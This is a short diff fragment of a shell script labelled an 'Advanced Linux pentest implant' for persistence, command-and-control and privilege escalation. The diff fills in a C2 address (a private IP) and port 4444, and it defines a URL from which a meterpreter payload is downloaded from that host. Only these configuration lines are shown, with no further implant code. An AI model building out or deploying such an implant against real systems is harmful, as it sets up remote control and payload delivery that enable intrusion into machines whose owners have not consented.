@@ -2,7 +2,7 @@
 # Advanced Linux pentest implant - Persistence + C2 + Privesc
 
 # Config
-C2_IP="YOUR_IP"
+C2_IP="192.168.0.127"
 C2_PORT="4444"
 METER_URL="http://${C2_IP}:8080/meterpreter.elf"
 
